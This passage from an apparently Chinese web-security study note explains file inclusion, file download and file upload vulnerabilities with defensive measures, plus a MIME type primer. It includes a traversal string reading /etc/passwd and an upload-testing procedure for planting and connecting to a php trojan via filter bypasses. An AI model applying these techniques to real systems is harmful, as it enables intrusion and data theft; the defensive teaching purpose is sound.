2.远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。 因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。

【文件包含漏洞的防御方法】：

  1. 避免使用动态文件包含函数，如PHP的include()或require()函数，尽量使用静态文件包含函数，如include_once()或require_once()函数。
  2. 对用户输入进行过滤和验证，避免用户输入包含特殊字符或恶意代码。
  3. 设置文件包含路径的白名单，限制只能包含应用程序所需的文件路径。
  4. 对应用程序进行安全性测试，及时修补漏洞并更新软件版本。
  5. 启用安全机制，如防火墙、入侵检测系统（IDS）和反病毒软件，及时监测和拦截攻击行为。

unsafe filedownload

文件下载漏洞是指攻击者通过某种方式绕过应用程序的身份验证和授权机制，直接下载应用程序目录中存储的敏感文件，或者通过改变文件名或目录名等方式获取应用程序中不应该公开的文件。这种漏洞常出现在Web应用程序中，可能会导致恶意用户窃取敏感数据，包括用户账号密码、支付信息、个人资料等。

一些常见的文件下载漏洞类型包括：

  1. 目录遍历漏洞：攻击者可以通过修改URL路径，访问应用程序目录中的敏感文件，例如../../../../etc/passwd。
  2. 未授权访问漏洞：应用程序没有进行身份验证和授权检查，攻击者可以通过直接访问URL路径下载敏感文件。
  3. 文件名截断漏洞：应用程序没有对文件名进行有效的验证，攻击者可以通过截断文件名的方式访问应用程序目录中的其他文件。
  4. MIME类型绕过漏洞：攻击者可以通过篡改HTTP响应头中的MIME类型，绕过浏览器的安全机制，让浏览器将恶意代码下载到本地执行。

为了防止文件下载漏洞，开发人员可以采取以下措施：

  1. 对文件名进行有效的验证和过滤，防止攻击者通过截断文件名等方式绕过应用程序的保护机制。
  2. 对下载请求进行身份验证和授权检查，只允许授权用户访问下载链接。
  3. 对应用程序目录进行严格的权限控制，确保只有授权用户才能访问敏感文件。
  4. 对HTTP响应头中的MIME类型进行有效的验证和过滤，确保浏览器不会执行恶意代码。
  5. 及时更新应用程序的安全补丁，修复已知的文件下载漏洞。

​ 文件上传漏洞是一种常见的Web安全漏洞，攻击者通过上传恶意文件来执行恶意代码或者获取系统权限。常见的攻击手段包括上传含有恶意脚本的文件、绕过文件类型验证、上传含有木马程序的文件等。

文件上传漏洞测试流程
1、上传文件，查看返回结果（路径，提示等）
2、尝试上传不同类型的“恶意”文件，比如xx.php文件，分析结果
3、查看html源码，看是否通过js在前端做了上传限制，想办法绕过
4、尝试使用不同方式进行绕过：黑白名单绕过/MIME类型绕过/目录0x00截断绕过等
5、猜测或者结合其他漏洞（比如敏感信息泄露等）得到木马路径，连接测试

为了防止文件上传漏洞，可以采取以下措施：

  1. 文件上传目录应该限制在web服务器根目录以外，并对上传文件的大小、类型、数量进行限制；
  2. 对上传文件的文件名、文件类型、文件内容进行严格检查，防止上传恶意脚本、木马程序等；
  3. 限制上传文件的访问权限，并禁止直接访问上传目录；
  4. 对上传文件进行病毒扫描，及时发现并清除上传的恶意文件；
  5. 定期清理上传目录中的无用文件

MIME type

​ MIME (Multipurpose Internet Mail Extensions) 是一种用于在互联网上传输各种格式数据的扩展协议。MIME 协议是为了解决 Internet 上各种电子邮件、文件传输和其他应用程序之间的互操作性而制定的。MIME 协议通过在邮件头中添加 Content-Type 和 Content-Encoding 等字段来描述邮件内容的类型和编码方式，从而使得邮件内容可以包含各种类型的数据，例如文本、图片、音频、视频、压缩文件等。MIME 类型是一种标准化的文本字符串，用于表示文件的媒体类型和子类型。它由两部分组成，中间用斜杠（/）分隔。例如，常见的 MIME 类型包括：

  • text/plain：纯文本文件
  • text/html：HTML 文件
  • application/json：JSON 数据文件
  • application/pdf：PDF 文件
  • image/jpeg：JPEG 图像文件
  • audio/mpeg：MPEG 音频文件
  • video/mp4：MP4 视频文件

MIME 类型通常用于指定 HTTP 响应中的 Content-Type 字段和电子邮件中的 MIME 部分，以便浏览器或邮件客户端可以正确地解析和显示内容。
